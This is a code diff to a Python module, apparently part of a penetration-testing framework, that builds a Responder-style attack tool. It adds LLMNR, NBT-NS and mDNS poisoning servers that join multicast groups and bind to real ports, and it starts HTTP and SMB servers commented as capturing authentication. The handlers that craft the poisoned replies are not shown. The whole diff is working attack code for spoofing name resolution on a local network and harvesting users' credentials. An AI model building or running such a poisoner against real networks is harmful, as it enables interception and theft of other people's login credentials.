@@ -11,9 +11,46 @@ from socketserver import ThreadingMixIn, UDPServer, TCPServer, BaseRequestHandle
 from src.utils.db_handler import DatabaseHandler
 from src.modules.storage.models import Plugin, Resultat
 
+class LLMNRPoisoner(ThreadingMixIn, UDPServer):
+    def __init__(self, server_address, responder):
+        self.responder = responder
+        self.allow_reuse_address = True  # Enable address reuse
+        UDPServer.__init__(self, server_address, LLMNRRequestHandler)
+        # Set up socket for multicast
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        # Join LLMNR multicast group
+        if '0.0.0.0' in server_address:
+            mreq = struct.pack("4s4s", socket.inet_aton('224.0.0.252'),
+                             socket.inet_aton('0.0.0.0'))
+            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+        
+class NBTNSPoisoner(ThreadingMixIn, UDPServer):
+    def __init__(self, server_address, responder):
+        self.responder = responder
+        self.allow_reuse_address = True  # Enable address reuse
+        UDPServer.__init__(self, server_address, NBTNSRequestHandler)
+        # Set up socket for broadcast
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+
+class MDNSPoisoner(ThreadingMixIn, UDPServer):
+    def __init__(self, server_address, responder):
+        self.responder = responder
+        self.allow_reuse_address = True  # Enable address reuse
+        UDPServer.__init__(self, server_address, MDNSRequestHandler)
+        # Set up socket for multicast
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        # Join MDNS multicast group
+        if '0.0.0.0' in server_address:
+            mreq = struct.pack("4s4s", socket.inet_aton('224.0.0.251'),
+                             socket.inet_aton('0.0.0.0'))
+            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+
 class ResponderCapture:
     def __init__(self, interface="0.0.0.0", 
-                 poisoning_ports={'llmnr': 5355, 'nbt-ns': 8137, 'mdns': 5353},
+                 poisoning_ports={'llmnr': 5355, 'nbt-ns': 137, 'mdns': 5353},
                  auth_ports={'http': 8080, 'smb': 8445}):
         self.logger = logging.getLogger(__name__)
         self.poisoning_ports = poisoning_ports
@@ -142,43 +179,42 @@ class ResponderCapture:
     def start_poisoning(self):
         """Start all poisoning and authentication servers"""
         try:
-            # Start poisoning servers - Bind UDP to 0.0.0.0
-            llmnr_server = LLMNRPoisoner(('0.0.0.0', self.poisoning_ports['llmnr']), self) # <-- Changed IP
+            # Start poisoning servers - bind UDP servers to 0.0.0.0
+            llmnr_server = LLMNRPoisoner(('0.0.0.0', self.poisoning_ports['llmnr']), self)
             llmnr_thread = threading.Thread(target=llmnr_server.serve_forever)
             llmnr_thread.daemon = True
             llmnr_thread.start()
             self.servers.append(llmnr_server)
-
-            nbtns_server = NBTNSPoisoner(('0.0.0.0', self.poisoning_ports['nbt-ns']), self) # <-- Changed IP
+            
+            nbtns_server = NBTNSPoisoner(('0.0.0.0', self.poisoning_ports['nbt-ns']), self)
             nbtns_thread = threading.Thread(target=nbtns_server.serve_forever)
             nbtns_thread.daemon = True
             nbtns_thread.start()
             self.servers.append(nbtns_server)
-
-            mdns_server = MDNSPoisoner(('0.0.0.0', self.poisoning_ports['mdns']), self) # <-- Changed IP
+            
+            mdns_server = MDNSPoisoner(('0.0.0.0', self.poisoning_ports['mdns']), self)
             mdns_thread = threading.Thread(target=mdns_server.serve_forever)
             mdns_thread.daemon = True
             mdns_thread.start()
             self.servers.append(mdns_server)
-
-            # Start HTTP server for capturing auth - Keep bound to specific interface IP
+            
+            # Start HTTP server for capturing auth - bind to specific interface
             http_server = HTTPServer((self.interface, self.auth_ports['http']), self)
             http_thread = threading.Thread(target=http_server.serve_forever)
             http_thread.daemon = True
             http_thread.start()
             self.servers.append(http_server)
-
-            # Start SMB server for capturing auth - Keep bound to specific interface IP
+            
+            # Start SMB server for capturing auth - bind to specific interface
             smb_server = SMBServer((self.interface, self.auth_ports['smb']), self)
             smb_thread = threading.Thread(target=smb_server.serve_forever)
             smb_thread.daemon = True
             smb_thread.start()
             self.servers.append(smb_server)
-
+            
             self.running = True
-            # Log the specific IP used for responses, even though UDP listens on 0.0.0.0
-            self.logger.info(f"Poisoning servers listening. Will respond with IP: {self.interface}")
-
+            self.logger.info(f"UDP poisoning servers listening on 0.0.0.0, will respond with {self.interface}")
+            
         except Exception as e:
             self.logger.error(f"Error starting servers: {e}")
             self.stop_poisoning()
@@ -219,21 +255,6 @@ class ResponderCapture:
     def get_response_ip(self):
         """Get the IP address to use in poisoned responses"""
         return self.interface
-
-class LLMNRPoisoner(ThreadingMixIn, UDPServer):
-    def __init__(self, server_address, responder):
-        self.responder = responder
-        UDPServer.__init__(self, server_address, LLMNRRequestHandler)
-        
-class NBTNSPoisoner(ThreadingMixIn, UDPServer):
-    def __init__(self, server_address, responder):
-        self.responder = responder
-        UDPServer.__init__(self, server_address, NBTNSRequestHandler)
-        
-class MDNSPoisoner(ThreadingMixIn, UDPServer):
-    def __init__(self, server_address, responder):
-        self.responder = responder
-        UDPServer.__init__(self, server_address, MDNSRequestHandler)
 
 class HTTPServer(ThreadingMixIn, TCPServer):
     def __init__(self, server_address, responder):
